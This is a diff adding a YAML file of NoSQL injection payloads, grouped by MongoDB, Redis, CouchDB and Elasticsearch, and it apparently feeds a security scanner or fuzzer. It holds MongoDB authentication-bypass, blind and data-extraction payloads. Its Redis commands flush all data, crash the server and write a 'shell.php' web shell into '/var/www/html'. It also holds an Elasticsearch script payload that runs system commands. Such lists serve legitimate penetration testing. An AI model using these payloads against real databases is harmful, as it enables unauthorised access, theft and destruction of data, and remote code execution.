@@ -1,0 +1,49 @@
+mongodb:
+  auth_bypass:
+  - '{"username":{"$gt":""},"password":{"$gt":""}}'
+  - '{"username":{"$ne":""},"password":{"$ne":""}}'
+  - '{"username":{"$regex":".*"},"password":{"$regex":".*"}}'
+  - '{"username":"admin","password":{"$gt":""}}'
+  - '{"username":"admin","password":{"$ne":"wrongpassword"}}'
+  - '{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$gt":""}}'
+  - '{"username":{"$in":["admin","administrator"]},"password":{"$gt":""}}'
+  - '{"username":"admin","password":{"$exists":true}}'
+  - '{"username":"admin","$or":[{"password":{"$gt":""}},{"password":{"$lt":"~"}}]}'
+  data_extraction:
+  - '{"$where":"this.username==''admin''"}'
+  - '{"$where":"Object.keys(this).length>0"}'
+  - '{"$where":"this.password.match(/^a/)"}'
+  - '{"$where":"sleep(5000)"}'
+  - '{"username":{"$regex":"^admin"}}'
+  - '{"password":{"$regex":"^.{0,10}$"}}'
+  - '{"$where":"function(){return this.username==''admin''}"}'
+  operator_injection:
+  - '{"username":"admin","password":{"$gt":"","$lt":"~"}}'
+  - '{"username":{"$type":2},"password":{"$type":2}}'
+  - '{"username":{"$size":5}}'
+  - '{"$and":[{"username":"admin"},{"password":{"$gt":""}}]}'
+  - '{"$nor":[{"username":"guest"}],"password":{"$gt":""}}'
+  blind:
+  - '{"username":"admin","password":{"$regex":"^a"}}'
+  - '{"username":"admin","password":{"$regex":"^b"}}'
+  - '{"username":"admin","$where":"this.password[0]==''a''"}'
+  - '{"username":"admin","$where":"this.password.length==8"}'
+redis:
+- "*1\r\n$4\r\nINFO\r\n"
+- "*1\r\n$4\r\nKEYS\r\n$1\r\n*\r\n"
+- "*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$4\r\nhack\r\n"
+- "*2\r\n$3\r\nGET\r\n$4\r\ntest\r\n"
+- "*1\r\n$8\r\nFLUSHALL\r\n"
+- "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$11\r\n/var/www/html\r\n"
+- "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n"
+- EVAL "return redis.call('INFO')" 0
+- DEBUG SEGFAULT
+couchdb:
+- '{"selector":{"_id":{"$gt":null}}}'
+- '{"selector":{"password":{"$regex":".*"}}}'
+- '{"selector":{"$or":[{"username":"admin"},{"role":"admin"}]}}'
+elasticsearch:
+- '{"query":{"match_all":{}}}'
+- '{"query":{"wildcard":{"password":"*"}}}'
+- '{"script_fields":{"test":{"script":"java.lang.Runtime.getRuntime().exec(''id'')"}}}'
+- '{"query":{"bool":{"must":[{"match":{"username":"admin"}}]}}}'
